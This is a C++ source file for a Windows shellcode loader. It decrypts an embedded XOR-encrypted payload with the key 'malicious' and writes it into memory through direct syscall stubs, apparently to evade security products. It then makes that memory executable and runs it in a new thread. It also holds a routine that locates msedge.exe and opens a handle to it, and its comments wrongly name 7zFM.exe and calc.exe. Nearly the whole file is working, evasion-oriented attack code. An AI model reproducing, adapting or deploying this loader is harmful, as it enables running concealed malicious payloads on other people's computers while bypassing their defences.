#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include "syscalls_common.h" 

HANDLE getHandle() {
    HANDLE hProcess; // Handle to the Process

    // enumerate through all windows processes to get their PIDs 
    HANDLE processsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0); // CreateToolhelp32Snapshot takes a snapshot of the specified processes, as well as the heaps, modules, and threads used by these processes.
    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) }; //Set the size of the structure before using it
    DWORD64 dwProcessId;
    // Find the PID of 7zFM.exe and save it for later
    if (Process32First(processsnapshot, &processEntry)) {
        while (_wcsicmp(processEntry.szExeFile, L"msedge.exe") != 0) {
            Process32Next(processsnapshot, &processEntry);
        }
    }
    // Contains the ID of 7zFM.exe
    dwProcessId = processEntry.th32ProcessID;
    // get a handle to the process 
    OBJECT_ATTRIBUTES pObjectAttributes;
    InitializeObjectAttributes(&pObjectAttributes, NULL, NULL, NULL, NULL);
    CLIENT_ID pClientId;
    pClientId.UniqueProcess = (PVOID)dwProcessId;
    pClientId.UniqueThread = (PVOID)0;

    NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &pObjectAttributes, &pClientId); // make a syscall with syswhisprs to get a handle to calc.exe
    return hProcess;
}

int main(int argc, char** argv) {
    /////////////////////////////// Shellcode decryption ////////////////////////////// 

    //printf("\nDecrypting shellcode\n");
    char encryptedShellcode[] = "\x91\x29\xef\x8d\x93\x81\xa3\x75\x73\x6d\x20\x3d\x28\x33\x3b\x27\x44\xa1\x3c\x04\x24\xe2\x31\x09\x27\xfe\x21\x75\x29\xe7\x3b\x43\x3f\x22\x44\xba\x25\xea\x1e\x39\x2b\x66\xd8\x3f\x39\x25\x50\xac\xc5\x5f\x08\x13\x77\x5f\x4d\x20\xad\xa0\x6e\x28\x6e\xb4\x91\x80\x33\x24\xe2\x31\x49\x2e\x24\xf8\x2f\x5d\x24\x68\xb3\x0f\xee\x0d\x6b\x66\x63\x63\xec\x11\x69\x6f\x75\xf8\xed\xe9\x6c\x69\x63\x21\xea\xb5\x07\x0a\x29\x6d\xb9\xe8\x21\x77\x31\xf8\x2d\x41\x25\x68\xb3\x39\x8c\x23\x3b\x92\xa8\x2d\xe2\x57\xe1\x27\x74\xa5\x20\x50\xa5\x21\x52\xa9\xc3\x34\xb2\xa4\x6c\x2d\x68\xa2\x51\x8f\x00\x82\x21\x62\x20\x4d\x6b\x2c\x56\xa4\x06\xb5\x39\x28\xe2\x23\x4d\x26\x74\xa3\x0b\x20\xe7\x65\x2b\x2d\xe4\x35\x6f\x24\x60\xbc\x28\xe8\x6d\xe7\x34\x2b\x25\x60\xbc\x28\x3b\x37\x36\x2f\x32\x35\x20\x35\x28\x39\x21\xec\x99\x53\x2c\x33\x93\x89\x3b\x28\x36\x2f\x3b\xe6\x73\x85\x22\x9c\x96\x90\x28\x3a\xd3\x16\x1f\x5b\x3c\x5a\x5d\x75\x73\x2c\x37\x25\xe0\x85\x21\xee\x99\xd3\x6c\x61\x6c\x20\xea\x8c\x26\xc9\x71\x6d\x70\x30\xa9\xcb\x0d\x26\x34\x27\x24\xe8\x88\x25\xea\x98\x2e\xcf\x3f\x1a\x47\x6b\x96\xb6\x25\xe6\x9f\x1b\x6c\x60\x6c\x69\x3a\x28\xd5\x5c\xf3\x06\x61\x93\xbc\x09\x63\x2e\x2b\x23\x3d\x2c\x5d\xa0\x2e\x58\xaf\x3d\x8c\xad\x29\xe5\xab\x2b\x96\xaf\x3d\xfa\xac\x20\xd6\x83\x6c\xb6\x8f\x8a\xa6\x25\xe8\xab\x03\x73\x28\x37\x39\xfa\x8f\x29\xe5\x90\x22\xd3\xf6\xd0\x07\x0c\x9e\xb9\xec\xa3\x1d\x65\x3c\x8c\xa3\x14\x89\x81\xf0\x69\x6f\x75\x3b\xee\x8d\x7c\x21\xea\x8b\x22\x44\xba\x07\x65\x2d\x31\x2b\xe0\x96\x34\xc9\x6f\xb8\xa4\x36\x9c\xbc\xec\x8d\x73\x13\x34\x24\xea\xa7\x49\x31\xfc\x85\x07\x21\x2d\x30\x0b\x69\x7f\x75\x73\x2c\x39\x24\xe0\x91\x21\x5e\xbc\x32\xd7\x39\xc8\x3a\x86\x96\xba\x3d\xfa\xae\x28\xe5\xae\x2e\x58\xa6\x3c\xfa\x9d\x29\xe5\xb3\x2b\xe0\x96\x34\xc9\x6f\xb8\xa4\x36\x9c\xbc\xec\x8d\x73\x10\x49\x34\x28\x34\x30\x07\x75\x33\x6d\x61\x2d\x31\x09\x69\x35\x34\xc9\x66\x4e\x63\x59\x9c\xbc\x38\x2c\x32\xd7\x14\x02\x24\x02\x96\xba\x3c\x8c\xa3\x88\x50\x96\x9c\x96\x27\x74\xb0\x25\x48\xaa\x21\xe6\x9f\x1a\xc1\x32\x92\x86\x34\x03\x63\x30\xd4\x95\x6e\x47\x6b\x2d\xe0\xb9\x96\xba";
    char key[] = "malicious";
    size_t legitrick_len = sizeof(encryptedShellcode);


    char encodedlegitrick[sizeof encryptedShellcode];

    int j = 0;
    for (int i = 0; i < sizeof encryptedShellcode; i++) {
        if (j == sizeof key - 1) j = 0;
        encodedlegitrick[i] = encryptedShellcode[i] ^ key[j];
        j++;
    }
    //printf("\nDecrypted.\n\n");

    /////////////////////////////// Shellcode Execution ////////////////////////////// 

    PVOID lpAllocationStart = nullptr;
    SIZE_T payloadSize = sizeof(encodedlegitrick);
    SIZE_T allocSize = ((payloadSize + 0xFFF) & ~0xFFF);
    HANDLE hProcess = GetCurrentProcess();
    HANDLE hThread;
    SIZE_T bytesWritten;
    ULONG oldProtect;

    //printf("\nInjecting...\n\n");

    NTSTATUS status = NtAllocateVirtualMemory(hProcess,&lpAllocationStart,0,&allocSize,MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);
    if (status != 0) {
        printf("NtAllocateVirtualMemory failed: 0x%x\n", status);
        return -1;
    }
    status = NtWriteVirtualMemory(hProcess,lpAllocationStart,encodedlegitrick,payloadSize,&bytesWritten);
    if (status != 0) {
        printf("NtWriteVirtualMemory failed: 0x%x\n", status);
        return -1;
    }
    status = NtProtectVirtualMemory(hProcess, &lpAllocationStart, &payloadSize, PAGE_EXECUTE_READ, &oldProtect);
    if (status != 0) {
        printf("NtProtectVirtualMemory failed: 0x%x\n", status);
        return -1;
    }
    NtCreateThreadEx(&hThread,GENERIC_EXECUTE,NULL,GetCurrentProcess(),lpAllocationStart,NULL,FALSE,0,0,0,NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(lpAllocationStart, 0, MEM_RELEASE);
    return 0;
}
